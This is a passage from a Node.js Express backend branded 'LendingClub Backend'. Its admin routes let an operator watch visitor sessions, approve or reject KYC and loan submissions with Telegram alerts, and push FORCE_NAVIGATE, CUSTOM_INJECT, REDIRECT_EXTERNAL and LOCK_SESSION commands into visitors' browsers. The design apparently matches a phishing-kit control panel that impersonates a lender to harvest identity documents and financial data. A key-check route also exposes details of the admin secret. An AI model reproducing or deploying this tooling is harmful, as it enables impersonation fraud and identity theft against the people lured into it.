    if (fs.existsSync(devPath)) {
      const html    = fs.readFileSync(devPath, 'utf8');
      const cssPath = path.join(DEV_FRAGMENTS_DIR, `${fragmentId}.css`);
      const css     = fs.existsSync(cssPath) ? fs.readFileSync(cssPath, 'utf8') : '';
      Log.debug(`/dev/fragment: Serving from dev-fragments/ — ${fragmentId}`);
      return res.json({ ok: true, fragment_id: fragmentId, html, css, source: 'dev-fragments' });
    }

    const fragment = FragmentStore.get(fragmentId);
    if (!fragment) {
      return res.status(404).json({
        ok:    false,
        error: `Fragment not found: ${fragmentId}`,
        hint:  `Create /dev-fragments/${fragmentId}.html or /fragments/${fragmentId}.html`,
      });
    }

    Log.debug(`/dev/fragment: Serving from fragments/ — ${fragmentId}`);
    return res.json({
      ok:          true,
      fragment_id: fragmentId,
      html:        fragment.html,
      css:         fragment.css,
      source:      'fragments',
    });
  });

  Log.info('Dev fragment endpoint active: GET /dev/fragment/:id (non-production only)');
}

// ================================================================
//  WEBHOOK SETUP HELPER
// ================================================================
app.get('/setup-telegram-webhook', adminAuth, async (req, res) => {
  try {
    const baseUrl = process.env.RENDER_EXTERNAL_URL || req.query.baseUrl;
    if (!baseUrl) {
      return res.status(400).json({
        error: 'Set RENDER_EXTERNAL_URL or pass ?baseUrl=https://your-app.onrender.com',
      });
    }
    const webhookUrl = `${baseUrl.replace(/\/$/, '')}/telegram/callback`;
    const result     = await telegram.setWebHook(webhookUrl);
    Log.info(`Telegram webhook set: ${webhookUrl}`);
    res.json({ ok: true, webhookUrl, result });
  } catch (err) {
    Log.error('setWebhook failed:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// ================================================================
//  ADMIN AUTH KEY CHECK
// ================================================================
app.get('/admin/key-check', loginLimiter, (req, res) => {
  const authHeader = req.headers['authorization'] || '';
  const provided   = (authHeader.startsWith('Bearer ') ? authHeader.slice(7) : (req.query.adminKey || '')).trim();
  const expected   = (ADMIN_KEY || '').trim();
  const match      = provided.length > 0 && provided === expected;
  const hint       = expected.length > 0
    ? crypto.createHash('sha256').update(expected).digest('hex').slice(0, 8)
    : 'NOT_SET';
  res.json({ match, provided_length: provided.length, expected_length: expected.length, expected_hint: hint });
});

// ================================================================
//  ADMIN API ROUTES
// ================================================================
app.get('/admin/sessions', adminAuth, async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('sessions')
      .select('*')
      .order('last_heartbeat', { ascending: false })
      .limit(100);
    if (error) throw error;

    const enriched = await Promise.all((data || []).map(async (s) => {
      const heartbeatAlive = await redis.exists(RK.heartbeat(s.session_id));
      const wsAlive        = await redis.hexists(RK.wsSessions(), s.session_id);
      return {
        ...s,
        ws_connected:   wsAlive === 1,
        heartbeat_live: heartbeatAlive === 1,
        status: wsAlive ? 'active' : 'idle',
      };
    }));
    res.json({ ok: true, sessions: enriched });
  } catch (err) {
    Log.error('/admin/sessions error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.get('/admin/session/:sessionId', adminAuth, async (req, res) => {
  try {
    const { sessionId }  = req.params;
    const sessionInfo    = await getSessionInfo(sessionId);
    const [subs, events, commands] = await Promise.all([
      supabase.from('submissions').select('*').eq('session_id', sessionId).order('submitted_at', { ascending: true }),
      supabase.from('events').select('*').eq('session_id', sessionId).order('created_at', { ascending: true }).limit(200),
      supabase.from('admin_commands').select('*').eq('session_id', sessionId).order('created_at', { ascending: false }).limit(50),
    ]);
    const redisState     = await redis.hgetall(RK.session(sessionId));
    const heartbeatAlive = await redis.exists(RK.heartbeat(sessionId));
    const saltExists     = await redis.exists(RK.sessionSalt(sessionId));
    res.json({
      ok: true,
      session:     sessionInfo,
      submissions: subs.data || [],
      events:      events.data || [],
      commands:    commands.data || [],
      redis:       { ...redisState, heartbeat_live: heartbeatAlive === 1, salt_exists: saltExists === 1 },
    });
  } catch (err) {
    Log.error('/admin/session/:id error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.get('/admin/submissions', adminAuth, async (req, res) => {
  try {
    const { status = 'pending_review', applicationId, limit = 50 } = req.query;
    let query = supabase
      .from('submissions')
      .select('*, applications(client_name, loan_amount, email)')
      .order('submitted_at', { ascending: true })
      .limit(parseInt(limit, 10));
    if (status !== 'all') query = query.eq('status', status);
    if (applicationId)    query = query.eq('application_id', applicationId);
    const { data, error } = await query;
    if (error) throw error;
    res.json({ ok: true, submissions: data || [] });
  } catch (err) {
    Log.error('/admin/submissions error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.post('/admin/approve/:submissionId', adminAuth, async (req, res) => {
  try {
    const { submissionId }              = req.params;
    const { admin_note = 'Approved by admin' } = req.body;
    const submission = await getSubmission(submissionId);
    if (!submission) return res.status(404).json({ error: 'Submission not found' });
    if (submission.status !== 'pending_review') {
      return res.status(409).json({ error: `Already ${submission.status}` });
    }
    const { session_id: sessionId, application_id: applicationId, step_type: stepType } = submission;

    await supabase.from('submissions').update({
      status: 'approved', admin_note,
      reviewed_at: new Date().toISOString(), reviewed_by: 'admin',
    }).eq('id', submissionId);

    const telegramSent = await sendTelegramApproval({ ...submission, admin_note });
    if (telegramSent) {
      await supabase.from('submissions').update({ telegram_sent: true }).eq('id', submissionId).catch(() => {});
    }

    const commandId = await insertCommand(sessionId, applicationId, 'APPROVE_STEP', {
      step_type: stepType, submission_id: submissionId,
    });
    await deliverCommand(sessionId, {
      type: 'APPROVE_STEP', id: commandId,
      payload: { step_type: stepType, submission_id: submissionId },
    });

    const nextFragments = FLOW_FRAGMENT_MAP[stepType];
    if (nextFragments) {
      setTimeout(async () => {
        for (const fragId of nextFragments) { await deliverFragment(sessionId, fragId); }
      }, 600);
    }

    broadcastToAdmins({ type: 'submission_approved', submissionId, sessionId, applicationId, stepType, ts: Date.now() });
    Log.info(`APPROVED: ${stepType} sub=${submissionId}`);
    res.json({ ok: true, commandId, telegramSent });
  } catch (err) {
    Log.error('/admin/approve error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.post('/admin/reject/:submissionId', adminAuth, async (req, res) => {
  try {
    const { submissionId }                           = req.params;
    const { reason = 'Verification failed.', allow_retry = true } = req.body;
    const submission = await getSubmission(submissionId);
    if (!submission) return res.status(404).json({ error: 'Submission not found' });
    const { session_id: sessionId, application_id: applicationId, step_type: stepType } = submission;

    await supabase.from('submissions').update({
      status: 'rejected', admin_note: reason,
      reviewed_at: new Date().toISOString(), reviewed_by: 'admin',
    }).eq('id', submissionId);

    const commandId = await insertCommand(sessionId, applicationId, 'REJECT_STEP', {
      step_type: stepType, reason, allow_retry,
    });
    await deliverCommand(sessionId, {
      type: 'REJECT_STEP', id: commandId,
      payload: { step_type: stepType, reason, allow_retry },
    });

    broadcastToAdmins({ type: 'submission_rejected', submissionId, sessionId, stepType, reason, ts: Date.now() });
    Log.info(`REJECTED: ${stepType} reason="${reason}"`);
    res.json({ ok: true, commandId });
  } catch (err) {
    Log.error('/admin/reject error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.post('/admin/command', adminAuth, async (req, res) => {
  try {
    const { sessionId, applicationId, commandType, payload } = req.body;
    if (!sessionId || !commandType) {
      return res.status(400).json({ error: 'sessionId and commandType required' });
    }

    const VALID_COMMANDS = [
      'FORCE_NAVIGATE', 'FORCE_NAVIGATE_PAGE',
      'RENDER_FRAGMENT',
      'OPEN_MODAL', 'CLOSE_MODAL', 'SHOW_TOAST', 'SHOW_MESSAGE',
      'REDIRECT_EXTERNAL',
      'LOCK_SESSION', 'UNLOCK_SESSION',
      'APPROVE_STEP', 'REJECT_STEP', 'REQUEST_RETRY',
      'CUSTOM_INJECT',
      'SHOW_LOADER', 'HIDE_LOADER',
      'REQUEST_UPLOAD', 'UPLOAD_RECEIVED',
      'OPEN_KYC_STEP',
      'APPROVE_SESSION', 'REJECT_SESSION',
    ];

    if (!VALID_COMMANDS.includes(commandType)) {
      return res.status(400).json({ error: `Invalid commandType: ${commandType}` });
    }

    const commandId = await insertCommand(sessionId, applicationId, commandType, payload || {});

    if (commandType === 'RENDER_FRAGMENT' && payload && payload.fragment_id) {
      await deliverFragment(sessionId, payload.fragment_id);
    } else {
      await deliverCommand(sessionId, {
        type: commandType, id: commandId, payload: payload || {},
      });
    }

    Log.info(`CMD: ${commandType} → session=${sessionId}`);
    res.json({ ok: true, commandId });
  } catch (err) {
    Log.error('/admin/command error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.get('/admin/applications', adminAuth, async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('applications').select('*')
      .order('created_at', { ascending: false }).limit(200);
    if (error) throw error;
    res.json({ ok: true, applications: data || [] });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/admin/stream', adminAuth, (req, res) => {
  res.setHeader('Content-Type',      'text/event-stream');
  res.setHeader('Cache-Control',     'no-cache, no-transform');
  res.setHeader('Connection',        'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');
  res.flushHeaders();

  adminSseClients.add(res);
  Log.info(`Admin SSE: connected (total=${adminSseClients.size})`);
  res.write(`data: ${JSON.stringify({ type: 'admin_connected', ts: Date.now() })}\n\n`);

  const keepAlive = setInterval(() => {
    if (res.writableEnded) { clearInterval(keepAlive); return; }
    res.write(`data: ${JSON.stringify({ type: 'heartbeat', ts: Date.now() })}\n\n`);
  }, 15000);

  req.on('close', () => {
    clearInterval(keepAlive);
    adminSseClients.delete(res);
    Log.info(`Admin SSE: disconnected (total=${adminSseClients.size})`);
  });
});

app.get('/admin/media-url', adminAuth, async (req, res) => {
  try {
    const { path: storagePath } = req.query;
    if (!storagePath) return res.status(400).json({ error: 'path required' });
    const { data, error } = await supabase.storage
      .from('kyc-media').createSignedUrl(storagePath, 86400);
    if (error) throw error;
    res.json({ ok: true, url: data.signedUrl });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ================================================================
//  PERIODIC CLEANUP
// ================================================================
setInterval(async () => {
  try {
    await supabase.from('sessions')
      .update({ connection_status: 'idle' })
      .lt('last_heartbeat', new Date(Date.now() - 120_000).toISOString())
      .eq('connection_status', 'online');
    await supabase.from('sessions')
      .update({ connection_status: 'disconnected' })
      .lt('last_heartbeat', new Date(Date.now() - 300_000).toISOString())
      .eq('connection_status', 'idle');
  } catch (e) {
    Log.debug('Cleanup tick error:', e.message);
  }
}, 60_000);

// ================================================================
//  ADMIN PANEL
// ================================================================
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// ================================================================
//  404 + ERROR HANDLERS
// ================================================================
app.use((_req, res) => res.status(404).json({ error: 'Not found' }));
app.use((err, _req, res, _next) => {
  Log.error('Unhandled Express error:', err.message);
  res.status(500).json({ error: 'Internal server error' });
});

// ================================================================
//  START SERVER
// ================================================================
server.listen(PORT, () => {
  Log.info(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
  Log.info(`LendingClub Backend v2.1.0 on port ${PORT}`);
  Log.info(`Environment: ${NODE_ENV}`);
  Log.info(`WebSocket:   ws://localhost:${PORT}/ws`);
  Log.info(`Admin WS:    ws://localhost:${PORT}/ws/admin`);
  Log.info(`Admin Panel: GET /admin`);
  Log.info(`HTTPS Poll:  GET /poll/:sessionId`);
  Log.info(`Step Submit: POST /step/submit`);
  Log.info(`Fragments:   GET /fragments/serve/:fragmentId`);
  if (!IS_PROD) Log.info(`Dev Frags:   GET /dev/fragment/:fragmentId`);
  Log.info(`Admin stream: GET /admin/stream`);
  Log.info(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

  FragmentStore.validate();

  const adminWS = setupAdminWS(server, {
    wsClients,
    sseClients,
    redis,
    supabase,
    deliverFragment,
    deliverCommand,
    insertCommand,
    FLOW_FRAGMENT_MAP,
    ADMIN_KEY:  process.env.ADMIN_SECRET_KEY,
    RK,
    Log,
  });
  _adminWsBroadcast = adminWS.broadcast;
  Log.info('Admin WebSocket channel initialized: /ws/admin');

  const renderUrl = process.env.RENDER_EXTERNAL_URL;
  if (renderUrl) {
    const webhookUrl = `${renderUrl.replace(/\/$/, '')}/telegram/callback`;
    telegram.setWebHook(webhookUrl)
      .then(() => Log.info(`Telegram webhook registered: ${webhookUrl}`))
      .catch(e  => Log.warn(`Telegram webhook failed (non-fatal): ${e.message}`));
  } else {
    Log.warn(`RENDER_EXTERNAL_URL not set — register webhook manually via GET /setup-telegram-webhook`);
  }
});

// Graceful shutdown
process.on('SIGTERM', () => {
  Log.info('SIGTERM — closing server gracefully');
  server.close(() => {
    redis.disconnect();
    Log.info('Server closed.');
    process.exit(0);
  });
});

module.exports = { app, server };
